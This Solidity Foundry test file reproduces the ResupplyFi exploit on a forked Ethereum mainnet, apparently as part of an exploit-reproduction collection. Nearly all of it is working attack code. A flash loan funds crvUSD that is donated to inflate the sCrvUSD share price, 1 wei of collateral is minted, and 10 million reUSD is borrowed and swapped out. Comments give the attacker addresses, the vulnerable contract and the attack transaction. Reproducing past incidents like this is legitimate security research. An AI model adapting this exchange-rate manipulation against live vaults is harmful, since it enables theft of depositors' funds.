// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 9.6M USD
// Attacker : https://etherscan.io/address/0x6d9f6e900ac2ce6770fd9f04f98b7b0fc355e2ea
// Attack Contract : https://etherscan.io/address/0xf90da523a7c19a0a3d8d4606242c46f1ee459dc7
// Created Attack Contract: https://etherscan.io/address/0x151aA63dbb7C605E7b0a173Ab7375e1450E79238
// Vulnerable Contract : https://etherscan.io/address/0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6
// Attack Tx : https://etherscan.io/tx/0xffbbd492e0605a8bb6d490c3cd879e87ff60862b0684160d08fd5711e7a872d3

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6#code

// @Analysis
// Post-mortem : https://mirror.xyz/0x521CB9b35514E9c8a8a929C890bf1489F63B2C84/ygJ1kh6satW9l_NDBM47V87CfaQbn2q0tWy_rtp76OI
// Twitter Guy : https://x.com/peckshield/status/1938061948647817647
// Hacking God : N/A

interface IERC20 {
    function approve(address, uint256) external;
    function balanceOf(
        address
    ) external view returns (uint256);
    function transfer(address, uint256) external;
}

interface ICurvePool {
    function exchange(int128, int128, uint256, uint256) external;
}

interface IsCRVUSD {
    function mint(
        uint256
    ) external;
    function approve(address, uint256) external;
    function balanceOf(
        address
    ) external view returns (uint256);
    function redeem(uint256, address, address) external;
}

interface IResupplyVault {
    function addCollateralVault(uint256, address) external;
    function borrow(uint256, uint256, address) external;
}

interface IUniswapV3Pool {
    function swap(address, bool, int256, uint160, bytes calldata) external;
}

interface IWETH {
    function balanceOf(
        address
    ) external view returns (uint256);
    function withdraw(
        uint256
    ) external;
}

interface IMorphoBlue {
    function flashLoan(address, uint256, bytes calldata) external;
}

contract ResupplyFi is BaseTestWithBalanceLog {
    // Token Addresses
    IERC20 private constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant crvUsd = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IsCRVUSD private constant sCrvUsd = IsCRVUSD(0x0655977FEb2f289A4aB78af67BAB0d17aAb84367);
    IERC20 private constant reUsd = IERC20(0x57aB1E0003F623289CD798B1824Be09a793e4Bec);
    IWETH private constant weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Contract Addresses
    IMorphoBlue private constant morphoBlue = IMorphoBlue(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    ICurvePool private constant curveUsdcCrvusdPool = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
    IsCRVUSD private constant sCrvUsdContract = IsCRVUSD(0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D);
    IResupplyVault private constant resupplyVault = IResupplyVault(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6);
    ICurvePool private constant curveReusdPool = ICurvePool(0xc522A6606BBA746d7960404F22a3DB936B6F4F50);
    IUniswapV3Pool private constant uniswapV3Pool = IUniswapV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);

    address private constant crvUSDController = 0x89707721927d7aaeeee513797A8d6cBbD0e08f41;

    // Exploit Parameters
    uint256 private constant forkBlockNumber = 22_785_460;
    uint256 private constant flashLoanAmount = 4000 * 1e6; // 4,000 USDC
    uint256 private constant crvUsdTransferAmount = 2000 * 1e18; // 2,000 crvUSD
    uint256 private constant sCrvUsdMintAmount = 1;
    uint256 private constant borrowAmount = 10_000_000 * 1e18; // 10,000,000 reUSD
    uint256 private constant redeemAmount = 9_339_517.438774046 ether; // ~9,339.52 sCrvUsd
    uint256 private constant finalExchangeAmount = 9_813_732.715269934 ether; // ~9,813.73 crvUSD

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", forkBlockNumber);
        fundingToken = address(usdc);
    }

    function testExploit() public balanceLog {
        usdc.approve(address(morphoBlue), type(uint256).max);
        morphoBlue.flashLoan(address(usdc), flashLoanAmount, hex"");
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        require(msg.sender == address(morphoBlue), "Caller is not MorphoBlue");
        _swapUsdcForCrvUsd();
        _manipulateOracles();
        _borrowAndSwapReUSD();
        _redeemAndFinalSwap();
    }

    function _swapUsdcForCrvUsd() internal {
        usdc.approve(address(curveUsdcCrvusdPool), type(uint256).max);
        curveUsdcCrvusdPool.exchange(0, 1, flashLoanAmount, 0);
    }

    function _manipulateOracles() internal {
        crvUsd.transfer(crvUSDController, crvUsdTransferAmount);
        crvUsd.approve(address(sCrvUsdContract), type(uint256).max);
        sCrvUsdContract.mint(sCrvUsdMintAmount);
    }

    function _borrowAndSwapReUSD() internal {
        sCrvUsdContract.approve(address(resupplyVault), type(uint256).max);
        resupplyVault.addCollateralVault(sCrvUsdMintAmount, address(this));
        resupplyVault.borrow(borrowAmount, 0, address(this));
        reUsd.approve(address(curveReusdPool), type(uint256).max);
        curveReusdPool.exchange(0, 1, reUsd.balanceOf(address(this)), 0);
    }

    function _redeemAndFinalSwap() internal {
        sCrvUsd.redeem(redeemAmount, address(this), address(this));
        crvUsd.approve(address(curveUsdcCrvusdPool), type(uint256).max);
        curveUsdcCrvusdPool.exchange(1, 0, finalExchangeAmount, 0);
    }
}
